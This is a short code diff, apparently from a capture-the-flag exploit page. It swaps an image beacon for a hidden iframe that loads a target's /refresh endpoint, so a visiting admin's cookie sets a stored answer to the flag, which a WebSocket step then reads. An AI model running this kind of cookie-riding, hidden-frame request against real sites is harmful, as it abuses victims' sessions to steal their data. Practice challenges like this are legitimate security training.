@@ -24,9 +24,13 @@
     };
 
     // Send a GET to /refresh to set answer=flag (if admin has flag cookie)
-    function primeAnswer() {
-      new Image().src = REFRESH_URL; // subresource beacon
-    }
+function primeAnswer() {
+  const iframe = document.createElement("iframe");
+  iframe.src = ORIGIN + "/refresh?cb=" + Date.now();
+  iframe.style.display = "none";
+  document.body.appendChild(iframe);
+}
+
 
     // Open WebSocket with timeout
     function openWS(timeoutMs = 4000) {
@@ -124,3 +128,4 @@
     main();
   </script>
 </body>
+
